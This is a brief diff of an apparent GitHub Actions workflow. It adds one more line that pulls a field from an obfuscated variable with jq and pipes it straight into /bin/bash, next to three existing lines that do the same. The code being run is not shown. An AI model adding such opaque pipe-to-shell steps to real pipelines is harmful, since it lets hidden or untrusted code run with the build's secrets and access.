@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$gzun16096" | jq -r .tv7189 | /bin/bash
           echo $md11998 | jq -r .h6 | /bin/bash
           echo $b3021 | jq -r .an14166 | /bin/bash
+          echo $rpht485 | jq -r .iqu98320 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
